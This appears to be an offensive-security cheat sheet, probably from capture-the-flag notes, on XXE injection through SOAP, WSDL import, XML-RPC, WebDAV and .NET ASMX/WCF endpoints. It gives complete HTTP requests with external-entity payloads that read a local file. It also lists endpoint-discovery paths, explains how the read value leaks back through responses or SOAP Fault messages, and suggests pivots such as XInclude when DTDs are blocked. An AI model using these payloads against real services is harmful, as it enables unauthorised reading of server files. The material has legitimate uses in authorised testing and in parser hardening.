# SOAP / WSDL / XML-RPC — the always-XML surfaces

## SOAP — a mandatory-XML surface

Every SOAP endpoint parses XML by contract — `Content-Type: text/xml`
or `application/soap+xml` + `SOAPAction:` header.

```xml
POST /service HTTP/1.1
Content-Type: text/xml
SOAPAction: "SomeAction"

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:Method xmlns:m="urn:x">
      <m:param>&x;</m:param>
    </m:Method>
  </soap:Body>
</soap:Envelope>
```

The entity sits inside a param the method echoes/uses → in-band read.
If the method errors, the SOAP `<Fault>` `<faultstring>` often carries
the substituted value → error channel.

## Discovering the endpoint

- `?wsdl` on any service path — `/service?wsdl`, `/api?wsdl`,
  `?WSDL` (case) — returns the WSDL = the endpoint map
- common paths: `/service`, `/soap`, `/api/soap`, `/webservice`,
  `/axis2/services/*`, `/ws/*`, `*.asmx`, `*.svc`, `*.php?wsdl`
- `WSDL` fetch → lists all operations + param names → target each
  `<soap:Body>` param

## The WSDL-import XXE — secondary surface

WSDL itself is XML — if the APP fetches/parses a WSDL you supply
(`import from URL` feature) — XXE inside the WSDL's `<wsdl:types>`/
`xsd:schema` elements.

## XML-RPC — `text/xml` + methodName

```xml
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<methodCall>
  <methodName>demo.method</methodName>
  <params><param><value>&x;</value></param></params>
</methodCall>
```

WordPress `/xmlrpc.php`, generic XML-RPC services — parse XML on every
call. `python xmlrpc.client` libs historically resolve entities.

## WebDAV / CalDAV / CardDAV — XML-method bodies

```
PROPFIND /dav/ HTTP/1.1
Content-Type: application/xml
Depth: 1

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<D:propfind xmlns:D="DAV:">
  <D:prop><D:displayname/>&x;</D:prop>
</D:propfind>
```

`PROPFIND`/`REPORT`/`MKCALENDAR`/`PROPPATCH`/`LOCK` — DAV methods take
XML bodies — the parser is server-side. The `multistatus` response may
echo property values → in-band channel.

## The "the SOAP action name is the param" twist

`SOAPAction: "method&x;"`? — SOAPAction is a header, not XML — doesn't
work for entities — but the action SELECTS the method; injection of a
`<soap:Header>` element with entities in it can hit custom header
processors.

## .NET WCF / ASMX — `*.asmx`/`*.svc`

ASP.NET `.asmx`/`*.svc` services: `DtdProcessing.Prohibit` default since
4.5.2 → DOCTYPE refused → error says `DTD is prohibited in this XML
document` — that error itself CONFIRMS the XML parser is there; pivot
to XInclude or a non-DOCTYPE surface.

## The "the SOAP Fault carries it" — error-channel inside the spec

SOAP mandates `<Fault><faultstring>` on errors — the substituted
entity value that fails validation lands in `faultstring` — the spec
itself is the error channel — `error-based.md`.

## Falsifiers

- endpoint 4xx's any `text/xml`/`soap` content → no XML parser
- `DTD is prohibited` errors + no XInclude → hardened
